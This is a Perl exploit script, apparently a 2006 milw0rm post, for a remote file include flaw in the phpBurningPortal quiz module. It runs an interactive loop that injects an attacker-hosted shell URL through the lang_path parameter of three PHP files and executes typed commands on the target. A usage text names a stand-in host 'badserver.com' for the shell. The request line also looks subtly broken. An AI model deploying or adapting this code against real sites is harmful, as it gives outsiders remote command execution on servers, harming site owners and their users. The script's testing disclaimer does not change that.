#!/usr/bin/perl

use LWP::UserAgent;
use LWP::Simple;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$fileno = @ARGV[3];

if(!$target || !$shellsite)
{
    usage();
}

header();

if ($fileno eq 1)
{
    $file = "quest_delete.php?lang_path=";
}
elsif ($fileno eq 2)
{
    $file = "quest_edit.php?lang_path=";
}
elsif ($fileno eq 3)
{
    $file = "quest_news.php?lang_path=";
}
else
{
    $file = "quest_delete.php?lang_path=";
}

print "[cmd]\$";
$cmd = <STDIN>;

while ($cmd !~ "exit")
{
    $xpl = LWP::UserAgent->new() or die;
        $req =
HTTP::Request->new(GET=>$target'/modules/includes/'.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)
or die("\n\n Failed to connect.");
        $res = $xpl->request($req);
        $r = $res->content;
        $r =~ tr/[\n]/[&#234;]/;

    if (@ARGV[4] eq "-r")
    {
        print $r;
    }

    print "[cmd]\$";
    $cmd = <STDIN>;
}

sub header()
{
    print q
    {
########################################################################
    phpBurningPortal quiz-modul-1.0.1 - Remote File Include Exploit
               Vulnerability discovered and exploit by r0ut3r
                       writ3r@gmail.com
            For portal administrator testing purposes only!
########################################################################
    };
}

sub usage()
{
header();
    print q
    {
########################################################################
Usage:
perl q_xpl.pl <Target website> <Shell Location> <CMD Variable> <No> <r>
<Target Website> - Path to target eg: www.qvuln.target.com
<Shell Location> - Path to shell eg: www.badserver.com/s.txt
<CMD Variable> - Shell command variable name eg: cmd
<No> - File number, corresponding to:
1: quest_delete.php
2: quest_edit.php
3: quest_news.php
<r> - Show output from shell
Example:
perl a.pl http://localhost http://localhost/s.txt cmd 1 -r
########################################################################
    };
exit();
}

# milw0rm.com [2006-10-15]